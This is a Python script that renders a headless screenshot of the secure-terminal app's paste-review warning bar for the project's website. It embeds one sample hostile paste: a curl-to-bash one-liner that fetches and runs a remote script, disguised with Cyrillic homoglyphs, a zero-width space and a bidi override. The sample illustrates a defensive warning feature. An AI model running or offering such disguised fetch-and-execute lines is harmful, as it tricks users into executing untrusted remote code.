#!/usr/bin/python3 -Bsu
## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""Render the in-window paste-review bar to a PNG, headless and deterministic.

The bar is the real one the app shows -- secure_terminal.review.ReviewBar --
fed a representative hostile paste (a curl | bash line whose domain and shell name
hide Cyrillic homoglyphs, plus a zero-width and a bidi override), so the summary,
the single mirror pane (which reuses the terminal's renderer in the tab's detail
mode, naming each hidden character inline) and the countdown-gated buttons appear
exactly as a user sees them. Used to generate the shot on the project's Pages
site; run it again to regenerate. No display is needed: it uses Qt's offscreen
platform and grab().

It imports the app (secure_terminal.review), so run it against an installed
secure-terminal or point PYTHONPATH at a checkout:

    PYTHONPATH=<secure-terminal>/usr/lib/python3/dist-packages \
        usr/share/secure-terminal-shots/paste-warning-shot.py <output.png> [paste|copy]

Usually driven via the `secure-terminal-shots` wrapper (this dir); it regenerates
both the paste and copy shots at once.

The payload is written with \\u escapes so this source stays plain ASCII; the
hidden characters live only in the rendered image.
"""

import os
import sys

# A headless grab needs no real display; force the offscreen platform before Qt
# initialises, unless the caller already chose one.
os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')

# HiDPI: render at SHOT_SCALE x device pixels (default 2) so the published shot stays
# crisp when a browser upscales it on a HiDPI display -- the site shows it at 1x via CSS
# (width:100%), matching the 2x-source convention the rest of the site uses. QT_SCALE_FACTOR
# scales the whole widget tree uniformly, so grab() returns a SHOT_SCALE x pixel image.
## Parse via int(), not str.isdigit(): isdigit() accepts unicode digits (superscripts etc.)
## that int() then rejects, which would crash at import.
try:
    SHOT_SCALE = int(os.environ.get('SHOT_SCALE', '2'))
except (TypeError, ValueError):
    SHOT_SCALE = 2
if SHOT_SCALE < 1:
    SHOT_SCALE = 2
## Assign, do not setdefault: Qt reads QT_SCALE_FACTOR at QApplication construction, so an
## inherited value would apply a different global scale than the MARGIN scaling below expects.
## The shot must pin its own factor.
os.environ['QT_SCALE_FACTOR'] = str(SHOT_SCALE)

from PyQt6.QtWidgets import QApplication, QWidget, QVBoxLayout   # noqa: E402
from PyQt6.QtGui import QImage, QPainter, QPalette, QColor       # noqa: E402
from PyQt6.QtCore import Qt                                      # noqa: E402

from secure_terminal.review import ReviewBar               # noqa: E402
from secure_terminal.sanitize import THEMES                # noqa: E402

# Match the app's shipped default theme so the shot never drifts from what users
# see. Colours come from THEMES (the single source of truth); only THEME_NAME
# needs touching if the app's default theme ever changes again.
THEME_NAME = 'light'

# A paste that looks like an ordinary install one-liner but hides look-alikes and
# invisibles: the 'a' in "example" and in "bash" are Cyrillic (U+0430), there is a
# zero-width space (U+200B), and a right-to-left override (U+202E) reorders the
# trailing comment. Escaped so this file stays ASCII-only.
PAYLOAD = ('curl -fsSL https://ex\u0430mple.com/get.sh | b\u0430sh\u200b'
           '  \u202e# trusted mirror\n')

# A non-zero countdown so the shot shows both send buttons disabled and counting
# down -- the anti-fat-finger gate, visible.
COUNTDOWN_SECONDS = 4

# Uniform frame kept around the content after trimming (px). The ReviewBar's
# preview panes have a 130px minimum height (review.py setMinimumSize) but the
# shot's payload is one line, so Qt reserves a screenful of empty pane below the
# text. Grabbing the widget verbatim bakes that in as dead white space; instead
# the grab is trimmed to the pixels that actually differ from the window
# background and re-padded with this margin on every side, so the shot is tight
# and framed consistently with the other top-level shots. Small enough to read as
# a snug card, large enough not to crowd the content. Scaled with SHOT_SCALE because it is
# applied on the already-scaled (device-pixel) grab, so the frame stays proportional.
MARGIN = 12 * SHOT_SCALE

# Vertical padding kept inside each preview pane, around its single line of text
# (px). The panes carry a 130px minimum height (review.py) and default (auto)
# scrollbars sized for a multi-line paste; the shot's payload is ONE line, so the
# app leaves a screenful of empty pane -- rendered as bare white space or, when
# the pane font overflows the pane width, a horizontal scrollbar along the
# bottom. For the shot each pane is instead sized to its one line with scrollbars
# off, so the panes read as tight cards. The live app is untouched -- its 130px
# minimum is right for a real multi-line paste.
PANE_INSET = 6


class _Term:
    """Minimal stand-in for the tab that held the paste: the bar reads its theme,
    font and display MODE to render the mirror pane (the terminal's theme, Hack
    font, detail mode -- so every hidden character is named inline)."""
    _theme = THEME_NAME

    def current_font_family(self):
        return 'Hack'

    def current_mode(self):
        # detail mode names each hidden character inline -- the most informative
        # view for the shot, and what the mirror shows when the tab is in detail.
        return 'detail'

    def dispatch_pending_paste(self, action):
        pass


def _theme_palette(app):
    """Style the shot from the app theme (THEMES = source of truth), so it is
    identical regardless of the desktop theme the capture runs under, and tracks
    the app's default theme automatically."""
    app.setStyle('Fusion')
    bg, fg = THEMES[THEME_NAME]
    light = QColor(bg).lightnessF() >= 0.5
    # button chrome derived from the base so it reads as a raised control against
    # the terminal background in either theme.
    button = QColor(bg).darker(108) if light else QColor(bg).lighter(160)
    pal = QPalette()
    pal.setColor(QPalette.ColorRole.Window, QColor(bg))
    pal.setColor(QPalette.ColorRole.WindowText, QColor(fg))
    pal.setColor(QPalette.ColorRole.Base, QColor(bg))
    pal.setColor(QPalette.ColorRole.Text, QColor(fg))
    pal.setColor(QPalette.ColorRole.Button, button)
    pal.setColor(QPalette.ColorRole.ButtonText, QColor(fg))
    app.setPalette(pal)


def _trim_to_content(image, bg, margin):
    """Crop `image` to the bounding box of pixels that differ from the window
    background `bg`, then re-pad with a uniform `margin` on every side.

    The ReviewBar reserves a fixed-minimum pane height regardless of content, so
    a one-line payload leaves a screenful of empty pane; this removes it. A pure,
    deterministic function of the pixels (a fixed background-difference threshold
    and a fixed margin), so re-running yields byte-identical output. Erring wide
    is safe: the threshold can only classify a pixel as content, never delete it.
    """
    image = image.convertToFormat(QImage.Format.Format_RGB32)
    # Compose in RAW device pixels. Under QT_SCALE_FACTOR the grab carries a >1
    # devicePixelRatio, and QPainter.drawImage() would then draw it at logical (half) size
    # into the physical-pixel-sized output, cramming the content into a corner and leaving a
    # dead band. Pin DPR=1 so every pixel dimension below is unambiguous; copies inherit it.
    image.setDevicePixelRatio(1.0)
    width, height = image.width(), image.height()
    bg_r, bg_g, bg_b = bg.red(), bg.green(), bg.blue()
    tol = 8   # absorb the anti-alias fringe against the flat background
    bits = image.constBits()
    bits.setsize(image.sizeInBytes())
    buf = memoryview(bits)
    stride = image.bytesPerLine()
    min_x, min_y, max_x, max_y = width, height, -1, -1
    for y in range(height):
        row = buf[y * stride:y * stride + width * 4]
        for x in range(width):
            i = x * 4
            # Format_RGB32 is little-endian BGRx in memory.
            if (abs(row[i] - bg_b) > tol or abs(row[i + 1] - bg_g) > tol
                    or abs(row[i + 2] - bg_r) > tol):
                if x < min_x:
                    min_x = x
                if x > max_x:
                    max_x = x
                if y < min_y:
                    min_y = y
                if y > max_y:
                    max_y = y
    if max_x < 0:
        return image        # all background; nothing to trim
    content = image.copy(min_x, min_y, max_x - min_x + 1, max_y - min_y + 1)
    out = QImage(content.width() + 2 * margin, content.height() + 2 * margin,
                 QImage.Format.Format_RGB32)
    out.fill(bg)
    painter = QPainter(out)
    painter.drawImage(margin, margin, content)
    painter.end()
    return out


def main(argv):
    if not 2 <= len(argv) <= 3 or (len(argv) == 3 and argv[2] not in ('paste', 'copy')):
        sys.stderr.write('usage: %s <output.png> [paste|copy]\n' % argv[0])
        return 2
    out = argv[1]
    kind = argv[2] if len(argv) == 3 else 'paste'
    # a copy is not executed, so it has no countdown (the paste anti-fat-finger
    # gate does not apply); a paste shows the gate counting down.
    delay = COUNTDOWN_SECONDS if kind == 'paste' else 0

    app = QApplication([argv[0], '-platform', os.environ['QT_QPA_PLATFORM']])
    _theme_palette(app)

    host = QWidget()
    layout = QVBoxLayout(host)
    layout.setContentsMargins(0, 0, 0, 0)
    bar = ReviewBar(host)
    layout.addWidget(bar)
    bar.show_review(_Term(), PAYLOAD, delay, kind)
    # Drop the auto scrollbars so the shot has no stray scrollbar. Width sized so
    # the mirror's inline-expanded line + the button row are roomy (the detail-mode
    # <U+XXXX NAME> expansion makes the line long; the word-wrapping summary would
    # otherwise let the layout compress below the content's real width).
    mirror = bar._mirror
    mirror.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
    mirror.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
    mirror.setMinimumHeight(0)
    host.setFixedWidth(1180)
    host.adjustSize()
    host.show()
    # let the layout settle so the mirror wraps to its final width before grabbing
    app.processEvents()
    app.processEvents()
    # Oversize the mirror a few lines and let _trim_to_content cut the dead
    # terminal-bg height below the actual content: at 1180 the detail expansion is
    # one line, but the offscreen document layout does not report a usable height,
    # so measuring it would clip. Trim (theme-bg keyed) gives a tight shot without
    # the fragile measurement. Overrides the app's 120px minimum for the shot only.
    mirror.setFixedHeight(3 * mirror.fontMetrics().lineSpacing() + 2 * PANE_INSET)
    host.adjustSize()
    app.processEvents()

    # Trim the fixed-minimum empty pane height off the grab so the shot is tight
    # and consistent with the other top-level shots (no dead white space below
    # the one-line payload), keeping a uniform margin. THEMES is the theme source
    # of truth, so the trim background matches what was rendered.
    image = _trim_to_content(host.grab().toImage(), QColor(THEMES[THEME_NAME][0]),
                             MARGIN)
    if not image.save(out, 'PNG'):
        sys.stderr.write('failed to write %s\n' % out)
        return 1
    sys.stderr.write('wrote %s (%dx%d)\n'
                     % (out, image.width(), image.height()))
    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
